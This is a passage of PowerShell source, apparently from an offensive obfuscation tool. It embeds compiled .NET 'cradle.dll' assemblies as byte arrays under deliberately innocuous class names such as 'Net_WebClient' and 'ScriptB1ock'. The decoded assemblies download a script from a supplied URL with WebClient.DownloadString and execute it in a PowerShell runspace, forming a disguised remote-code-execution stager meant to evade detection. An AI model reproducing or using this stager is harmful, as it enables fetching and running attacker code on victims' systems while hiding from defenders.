52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('Net_WebClient' , 'Equals'            , @("$CompiledHeader`37,48,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(40,35,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,176,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,212,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,76,2,0,0,8,0,0,0,35,85,83,0,84,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,100,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,51,0,44,0,6,0,103,0,71,0,6,0,135,0,71,0,10,0,187,0,176,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,58,0,10,0,1,0,109,32,0,0,0,0,134,24,65,0,15,0,2,0,0,0,1,0,172,0,17,0,65,0,19,0,25,0,65,0,15,0,33,0,65,0,15,0,33,0,197,0,24,0,9,0,65,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(165,0,0,0,2)+@(0)*11+@(1,0,35,0,0,0,0,0,2)+@(0)*11+@(1,0,44)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,78,101,116,95,87,101,98,67,108,105,101,110,116,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,3,32,0,0,0,0,0,6,97,190,113,24,12,125,66,189,92,181,230,57,204,200,210,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,80,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`65,48,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,254,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(164,36,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,4,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(224,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,8,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,172,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,124,3,0,0,8,0,0,0,35,85,83,0,132,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,148,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,51,0,44,0,6,0,107,0,75,0,6,0,139,0,75,0,10,0,244,0,205,0,10,0,4,1,205,0,10,0,33,1,176,0,14,0,75,1,64,1,6,0,141,1,110,1,10,0,154,1,176,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,58,0,10,0,1,0,146,32,0,0,0,0,134,24,65,0,15,0,2,0,0,0,1,0,71,0,17,0,65,0,19,0,25,0,65,0,15,0,33,0,13,1,33,0,41,0,28,1,15,0,49,0,44,1,38,0,49,0,51,1,43,0,57,0,65,0,15,0,57,0,85,1,49,0,49,0,100,1,54,0,49,0,163,1,60,0,9,0,65,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(169,0,0,0,4)+@(0)*11+@(1,0,35,0,0,0,0,0,3)+@(0)*11+@(24,0,176,0,0,0,0,0,4)+@(0)*11+@(1,0,44)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,78,101,116,95,87,101,98,67,108,105,101,110,116,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,32,0,0,0,0,0,161,51,109,85,42,140,10,72,164,122,10,239,162,208,141,15,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,204,36)+@(0)*8+@(0,0,238,36,0,0,0,32)+@(0)*22+@(224,36)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*266+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,0,53)+@(0)*502","$CompiledHeader`83,48,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(232,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,64,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,204,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,172,3,0,0,8,0,0,0,35,85,83,0,180,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,196,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,51,0,44,0,6,0,125,0,93,0,6,0,157,0,93,0,10,0,6,1,223,0,10,0,22,1,223,0,10,0,51,1,194,0,14,0,93,1,82,1,6,0,118,1,44,0,6,0,173,1,142,1,10,0,186,1,194,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,58,0,10,0,1,0,157,32,0,0,0,0,134,24,65,0,16,0,3,0,0,0,1,0,71,0,0,0,2,0,75,0,17,0,65,0,20,0,25,0,65,0,16,0,33,0,31,1,34,0,41,0,46,1,16,0,49,0,62,1,39,0,49,0,69,1,44,0,57,0,65,0,16,0,57,0,103,1,50,0,65,0,125,1,55,0,49,0,132,1,62,0,49,0,195,1,68,0,9,0,65,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(187,0,0,0,4)+@(0)*11+@(1,0,35,0,0,0,0,0,3)+@(0)*11+@(25,0,194,0,0,0,0,0,4)+@(0)*11+@(1,0,44)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,78,101,116,95,87,101,98,67,108,105,101,110,116,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,59,0,0,0,0,0,10,242,76,126,88,245,142,71,171,110,159,31,34,145,235,170,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,16,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('ScriptB1ock'   , 'Equals'            , @("$CompiledHeader`144,46,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(40,35,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,176,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,212,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,76,2,0,0,8,0,0,0,35,85,83,0,84,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,100,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,49,0,42,0,6,0,101,0,69,0,6,0,133,0,69,0,10,0,185,0,174,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,56,0,10,0,1,0,109,32,0,0,0,0,134,24,63,0,15,0,2,0,0,0,1,0,170,0,17,0,63,0,19,0,25,0,63,0,15,0,33,0,63,0,15,0,33,0,195,0,24,0,9,0,63,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(163,0,0,0,2)+@(0)*11+@(1,0,33,0,0,0,0,0,2)+@(0)*11+@(1,0,42)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,83,99,114,105,112,116,66,49,111,99,107,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,0,3,32,0,0,0,0,0,28,70,13,160,27,14,65,78,177,238,4,93,136,70,143,3,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,80,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,